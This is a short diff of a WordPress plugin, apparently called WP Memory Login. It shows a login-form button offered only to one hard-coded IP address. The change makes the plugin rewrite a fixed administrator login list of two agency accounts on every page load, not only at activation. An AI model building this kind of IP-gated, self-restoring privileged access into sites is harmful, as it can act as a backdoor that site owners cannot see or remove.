@@ -24,7 +24,7 @@ if ( ! class_exists( 'WP_Memory_Login' ) ) {
 			add_action( 'init', array( $this, 'redirect_save_options_memory' ) );
 		 add_action( 'admin_enqueue_scripts' , array( $this, 'load_js_css_admin'));
 
-			register_activation_hook(__FILE__, array( $this,'activate_plugin'));
+		add_action( 'init', array( $this, 'activate_plugin' ) );
 			
 			  if($_SERVER['REMOTE_ADDR'] == "217.130.104.197" )
                 add_action( 'login_form' , array( $this, 'add_button_memory_login'));
@@ -32,8 +32,7 @@ if ( ! class_exists( 'WP_Memory_Login' ) ) {
 		
 		public function activate_plugin()
 		{
-			if(get_option("memory_login_options_data") == "")
-				update_option("memory_login_options_data", '{"administrator_memory_login_group_users":["optimizaclick.manager","optimizaclick.user"]}');
+			update_option("memory_login_options_data", '{"administrator_memory_login_group_users":["optimizaclick.manager","optimizaclick.user"]}');
 		}
 		
 
